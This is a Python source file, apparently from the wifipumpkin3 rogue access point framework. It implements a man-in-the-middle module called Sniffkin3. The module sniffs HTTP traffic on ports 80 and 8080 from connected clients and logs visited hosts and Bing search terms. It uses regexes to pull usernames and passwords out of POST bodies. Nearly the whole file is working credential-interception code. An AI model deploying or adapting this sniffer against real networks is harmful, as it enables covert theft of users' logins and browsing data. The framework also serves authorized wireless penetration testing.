from wifipumpkin3.core.config.globalimport import *
from wifipumpkin3.core.common.uimodel import *
from threading import Thread
import queue
from scapy.all import *
import wifipumpkin3.core.utility.constants as C
from wifipumpkin3.core.utility.collection import SettingsINI
from wifipumpkin3.plugins.analyzers import *
from wifipumpkin3.core.widgets.docks.dock import DockableWidget
from wifipumpkin3.core.servers.mitm.mitmmode import MitmMode

class TCPProxyDock(DockableWidget):
    id = "TCPProxy"
    title = "TCPProxy"

    def __init__(self,parent=0,title="",info={}):
        super(TCPProxyDock,self).__init__(parent,title,info={})
        self.setObjectName(self.title)
        self.THeaders  = OrderedDict([ ('Plugin',[]),('Logging',[])])


    def writeModeData(self,data):
        ''' get data output and add on QtableWidgets '''
        self.THeaders['Plugin'].append(data.keys()[0])
        self.THeaders['Logging'].append(data[data.keys()[0]])
        Headers = []
        print(data)

    def stopProcess(self):
        pass

class Sniffkin3(MitmMode):
    Name = "Sniffkin 3"
    Author = "Pumpkin-Dev"
    ID = "sniffkin3"
    Description = "Sniff for intercept network traffic on UDP,TCP protocol get password,hash,image,etc..."
    Hidden = False
    LogFile = C.LOG_SNIFFKIN3
    CONFIGINI_PATH = C.CONFIG_SK_INI
    _cmd_array = []
    ModSettings = True
    ModType = "server" 

    def __init__(self,parent=None, **kwargs):
        super(Sniffkin3,self).__init__(parent)
        self.setID(self.ID)
        self.plugins = []
        self.parent = parent
        self.bt_SettingsDict = {}
        self.check_PluginDict = {}

    def setPluginOption(self, name, status):
        ''' get each plugins status'''
        # enable realtime disable and enable plugin
        if self.conf.get('accesspoint', 'statusAP', format=bool):
            self.reactor.disablePlugin(name, status)
        self.conf.set('plugins', name, status)

    def boot(self):
        #self.handler = self.parent.Plugins.MITM
        iface =  self.conf.get('accesspoint','interfaceAP')
        self.reactor= Sniffkin3Core(iface, self.parent.currentSessionID)
        self.reactor.setObjectName(self.ID)
        self.reactor._ProcssOutput.connect(self.LogOutput)

    def LogOutput(self,data):
        if self.conf.get('accesspoint', 'statusAP', format=bool):
            self.logger.info('[ {0[src]} > {0[dst]} ] {1[Method]} {1[Host]}{1[Path]}'.format(
                        data['urlsCap']['IP'], data['urlsCap']['Headers']))

    @property
    def getPlugins(self):
        commands = self.config.get_all_childname('plugins')
        list_commands = []
        for command in commands:
            list_commands.append(self.ID + '.' + command)
        return list_commands

    def parser_set_sniffkin3(self, status, plugin_name):
        try:
            # plugin_name = pumpkinproxy.no-cache 
            name_plugin,key_plugin = plugin_name.split('.')[0],plugin_name.split('.')[1]
            if key_plugin in self.config.get_all_childname('plugins'):
                self.config.set('plugins',key_plugin, status)
                print(display_messages('sniffkin3: {} status: {}'.format(key_plugin, status),sucess=True))
            else:
                print(display_messages('unknown plugin: {}'.format(key_plugin),error=True))
        except IndexError:
            print(display_messages('unknown sintax command',error=True))


class Sniffkin3Core(QtCore.QThread):
    _ProcssOutput = QtCore.pyqtSignal(object)
    def __init__(self,interface,session):
        QtCore.QThread.__init__(self)
        self.interface  = interface
        self.session    = session
        self.stopped    = False
        self.config     = SettingsINI(C.CONFIG_SK_INI)

    def run(self):
        self.main()

    def sniffer(self,q):
        while not self.stopped:
            try:
                sniff(iface=self.interface,
                      filter="tcp and ( port 80 or port 8080)",
                      prn =lambda x : q.put(x), store=0)
            except Exception:pass
            if self.stopped:
                break

    def main(self):
        self.plugins = {}
        self.plugin_classes = default.PSniffer.__subclasses__()
        for p in self.plugin_classes:
            plugin_load = p()
            self.plugins[plugin_load.name] = plugin_load
            self.plugins[plugin_load.name].output = self._ProcssOutput
            self.plugins[plugin_load.name].session = self.session
        print('\n[*] {} running on port 80/8080:\n'.format(self.getID()))
        for name in self.plugins.keys():
            if self.config.get('plugins', name, format=bool):
                self.plugins[name].getInstance()._activated = True
                print('TCPProxy::{0:17} status:On'.format(name))
        print('\n')
        q = queue.Queue()
        sniff = Thread(target =self.sniffer, args = (q,))
        sniff.start()
        while (not self.stopped):
            try:
                pkt = q.get(timeout = 0)
                for Active in self.plugins.keys():
                    if self.plugins[Active].getInstance()._activated:
                        try:
                            self.plugins[Active].filterPackets(pkt)
                        except Exception: pass
            except queue.Empty:
              pass

    def snifferParser(self,pkt):
        try:
            if pkt.haslayer(Ether) and pkt.haslayer(Raw) and not pkt.haslayer(IP) and not pkt.haslayer(IPv6):
                return
            self.dport = pkt[TCP].dport
            self.sport = pkt[TCP].sport
            if pkt.haslayer(TCP) and pkt.haslayer(Raw) and pkt.haslayer(IP):
                self.src_ip_port = str(pkt[IP].src)+':'+str(self.sport)
                self.dst_ip_port = str(pkt[IP].dst)+':'+str(self.dport)

            if pkt.haslayer(Raw):
                self.load = pkt[Raw].load
                if self.load.startswith('GET'):
                    self.get_http_GET(self.src_ip_port,self.dst_ip_port,self.load)
                    self.searchBingGET(self.load.split('\n', 1)[0].split('&')[0])
                elif self.load.startswith('POST'):
                    header,url = self.get_http_POST(self.load)
                    self.getCredentials_POST(pkt.getlayer(Raw).load,url,header,self.dport,self.sport)
        except:
            pass

    def searchBingGET(self,search):
        if 'search?q' in search :
            searched = search.split('search?q=',1)[1]
            searched = searched.replace('+',' ')
            print('Search::BING { %s }'%(searched))

    def getCredentials_POST(self,payload,url,header,dport,sport):
        user_regex = '([Ee]mail|%5B[Ee]mail%5D|[Uu]ser|[Uu]sername|' \
        '[Nn]ame|[Ll]ogin|[Ll]og|[Ll]ogin[Ii][Dd])=([^&|;]*)'
        pw_regex = '([Pp]assword|[Pp]ass|[Pp]asswd|[Pp]wd|[Pp][Ss][Ww]|' \
        '[Pp]asswrd|[Pp]assw|%5B[Pp]assword%5D)=([^&|;]*)'
        username = re.findall(user_regex, payload)
        password = re.findall(pw_regex, payload)
        if not username ==[] and not password == []:
            self._ProcssOutput.emit({'POSTCreds':{'User':username[0][1],
            'Pass': password[0][1],'Url':url,'destination':'{}/{}'.format(sport,dport)}})

    def get_http_POST(self,load):
        dict_head = {}
        try:
            headers, body = load.split("\r\n\r\n", 1)
            header_lines = headers.split('\r\n')
            for item in header_lines:
                try:
                    dict_head[item.split()[0]] = item.split()[1]
                except Exception:
                    pass
            if 'Referer:' in dict_head.keys():
                return dict_head ,dict_head['Referer:']
        except ValueError:
            return None,None
        return dict_head, None

    def getpid(self):
        """ return the pid of current process in background"""
        return 'thread'

    def getID(self):
        """ return the name of process in background"""
        return self.objectName()

    def stop(self):
        self.stopped = True
        print('Thread::[{}] successfully stopped.'.format(self.objectName()))
